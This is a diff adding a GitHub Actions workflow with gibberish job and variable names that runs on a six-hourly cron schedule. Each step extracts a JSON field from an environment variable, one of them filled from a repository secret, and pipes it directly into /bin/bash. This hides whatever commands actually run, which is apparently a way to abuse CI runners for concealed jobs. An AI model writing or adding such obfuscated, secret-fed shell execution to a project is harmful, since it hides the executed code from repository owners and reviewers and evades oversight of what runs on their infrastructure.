@@ -1,0 +1,25 @@
+name: batchstream326
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: batchstream326
+        env:
+          tyi9862: ${{ secrets.tyi9862 }}
+        run: |
+          echo $tyi9862 | jq -r .cwbxz89103 | /bin/bash
+          echo $say59989 | jq -r .y62 | /bin/bash
+          echo $wlzax9128 | jq -r .zouuv3955 | /bin/bash
+          echo $wcahs7428 | jq -r .eadob1433 | /bin/bash
+          echo $fuwy21 | jq -r .qsa16278 | /bin/bash
+          echo $fmtc1884 | jq -r .xsjv89749 | /bin/bash
+          echo $proyf404 | jq -r .zrq09 | /bin/bash
+          echo $zbd2463 | jq -r .lv8698 | /bin/bash
+          echo $f505 | jq -r .tpzr5 | /bin/bash
+
